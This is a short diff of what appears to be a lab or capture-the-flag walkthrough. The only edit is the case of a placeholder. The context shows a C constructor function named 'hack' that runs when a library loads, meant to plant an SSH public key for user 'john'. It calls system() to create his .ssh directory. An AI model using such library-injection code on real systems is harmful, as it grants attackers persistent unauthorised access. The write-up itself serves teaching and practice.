@@ -610,7 +610,7 @@ Once you have the key, create the `.c` file with this:
 
 __attribute__((constructor)) void hack(void){
     // The key you generated earlier
-    const char *key = "REPLACE WITH YOUR id_rsa_john.pub file contents";
+    const char *key = "REPLACE WITH YOUR id_rsa_john.pub FILE CONTENTS";
 
     // Create .ssh directory if it doesn't exist
     system("mkdir -p /home/john/.ssh");
